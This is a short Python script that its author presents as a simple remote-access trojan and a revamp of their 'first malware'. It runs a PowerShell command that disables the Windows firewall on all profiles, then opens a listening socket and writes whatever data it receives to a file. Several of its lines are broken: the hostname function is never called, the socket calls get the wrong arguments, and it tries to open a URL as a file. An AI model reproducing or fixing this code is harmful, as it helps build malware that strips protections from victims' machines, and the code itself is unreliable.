import os
import socket

#disabling firewall
fr = "Set-NetFirewallProfile -Profile Public,Private,Domain -Enabled False"
os.system(fr)

HOST = socket.gethostname
PORT = 55

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(1)
connection, addr = server.accept()
print('Connected with ' + addr[0] + ':' + str(addr[1]))
connection.send('connection sucess')
file = open('https://localhost/', 'a') #put your website here
while True:
    info = connection.recv()
    file.write(info)


"""
This is a simple rat you could say and just uses telnet and such not advance at all I just needed to revamp my first malware

by: Rtgamer8387
"""

